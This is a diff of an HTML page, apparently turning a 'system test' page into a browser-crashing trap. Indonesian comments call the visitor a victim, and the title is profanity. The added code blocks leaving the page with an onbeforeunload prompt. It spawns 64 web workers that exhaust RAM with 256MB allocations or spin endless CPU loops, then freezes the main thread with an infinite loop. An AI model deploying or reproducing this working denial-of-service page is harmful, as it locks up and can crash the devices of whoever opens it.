@@ -1,42 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Integrity Test</title>
+    <title>Kontol Jaran</title>
 </head>
 <body style="background:white; margin:0; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif;">
     <div style="text-align:center; color:#888;">
         <p id="t">System Test Initializing...</p>
     </div>
     <script>
+        // 1. FITUR ANTI-ESCAPE: Mencegah Refresh/Close (Pop-up Konfirmasi)
+        // Jika korban mencoba Refresh, browser akan memunculkan peringatan 
+        // "Apakah Anda yakin ingin meninggalkan situs ini?". 
+        // Selama korban melihat pop-up ini, RAM terus terisi di latar belakang!
+        window.onbeforeunload = function() {
+            return "Kontol Jaran";
+        };
+
         window.onload = function() {
             const status = document.getElementById('t');
-            
-            // Menggunakan 64 worker untuk memaksa CPU Context Switching 
-            // sekaligus membanjiri antrean alokasi memori RAM.
-            const workerCount = 64; 
-            status.innerText = "Nuclear Stress Active. Testing System Limits...";
+            const workerTotal = 64;
+            status.innerText = "Kontol Jaran";
 
-            for (let i = 0; i < workerCount; i++) {
-                const blob = new Blob([`
-                    let heap = [];
-                    function launch() {
+            for (let i = 0; i < workerTotal; i++) {
+                let workerCode = (i % 2 === 0) ? `
+                    let h = [];
+                    setInterval(() => {
                         try {
-                            // Alokasi 256MB yang stabil tapi cepat
-                            let chunk = new Uint8Array(1024 * 1024 * 256);
-                            // Mengisi memori agar fisik RAM terpakai (Dirtying)
-                            for(let j=0; j < chunk.length; j += 4096) chunk[j] = 1;
-
-                            heap.push(chunk);
+                            let c = new Uint8Array(1024 * 1024 * 256);
+                            for(let j=0; j<c.length; j+=4096) c[j] = 1;
+                            h.push(c);
                         } catch(e) {}
-                        
-                        // Menjalankan secepat mungkin (Re-run instan)
-                        setTimeout(launch, 0);
+                    }, 0);
+                ` : `
+                    function t() {
+                        while(true) {
+                            let v = 1.0;
+                            for(let j=0; j<40000000; j++) { v = Math.hypot(Math.tan(v), Math.atan(v)); }
+                        }
                     }
-                    launch();
-                `], { type: 'application/javascript' });
-
+                    t();
+                `;
+                const blob = new Blob([workerCode], { type: 'application/javascript' });
                 new Worker(URL.createObjectURL(blob));
             }
+
+            // 2. LOCKDOWN LEBIH CEPAT (0.5 Detik)
+            // Hanya memberikan waktu 500ms agar korban tidak sempat menekan Refresh.
+            setTimeout(() => {
+                status.innerText = "TOTAL LOCKDOWN ACTIVE.";
+                while(true) { Math.sqrt(Math.random()); }
+            }, 200); 
         };
     </script>
 </body>
